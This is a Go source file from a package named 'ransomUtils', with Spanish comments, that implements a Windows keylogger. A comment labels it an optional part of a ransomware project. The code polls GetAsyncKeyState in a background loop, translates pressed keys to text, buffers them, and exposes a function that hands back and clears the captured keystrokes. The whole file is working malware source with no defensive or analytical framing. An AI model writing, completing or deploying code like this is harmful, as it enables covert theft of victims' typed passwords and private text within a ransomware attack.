package ransomUtils

import (
	"strings"
	"sync"
	"syscall"
	"time"
)

//parte opcional: keylogger

var user32 = syscall.NewLazyDLL("user32.dll")
var presionada = user32.NewProc("GetAsyncKeyState")

var (
	muTeclas     sync.Mutex         //para controlar acceso a buffer
	bufferTeclas strings.Builder
	estadoPrev   = map[uintptr]bool{}
)

func RegistroTeclas() {
	go func() {
		for {
			for vk := uintptr(0x08); vk < 0xFE; vk++ {
				ret, _, _ := presionada.Call(vk)
				activa := ret&0x8000 != 0 //pulsada en este momento

				//solo se anota cuando pasa de reposo a pulsada
				if activa && !estadoPrev[vk] {
					texto := teclaATexto(vk)
					if texto != "" {
						muTeclas.Lock()
						bufferTeclas.WriteString(texto)
						muTeclas.Unlock()
					}
				}
				estadoPrev[vk] = activa
			}
			time.Sleep(8 * time.Millisecond)
		}
	}()
}

//traduce de tecla pulsada a lo que se escribio
func teclaATexto(vk uintptr) string {
	switch vk {
	case 0x08:
		return "[BS]"
	case 0x09:
		return "[TAB]"
	case 0x0D:
		return "\n"
	case 0x1B:
		return "[ESC]"
	case 0x20:
		return " "
	case 0x25:
		return "[IZQUIERDA]"
	case 0x26:
		return "[ARRIBA]"
	case 0x27:
		return "[DERECHA]"
	case 0x28:
		return "[ABAJO]"
	case 0x2E:
		return "[SUPR]"
	case 0xBA:
		return "ñ"
	case 0xBC:
		return ","
	case 0xBD:
		return "-"
	case 0xBE:
		return "."
	}

	//digitos
	if vk >= 0x30 && vk <= 0x39 {
		return string(rune('0' + vk - 0x30))
	}
	//letras
	if vk >= 0x41 && vk <= 0x5A {
		return string(rune('a' + vk - 0x41))
	}

	return ""
}

func VaciarTeclas() string {
	muTeclas.Lock()
	defer muTeclas.Unlock()

	texto := bufferTeclas.String()
	bufferTeclas.Reset()

	if texto == "" {
		return "(sin teclas nuevas)"
	}
	return texto
}
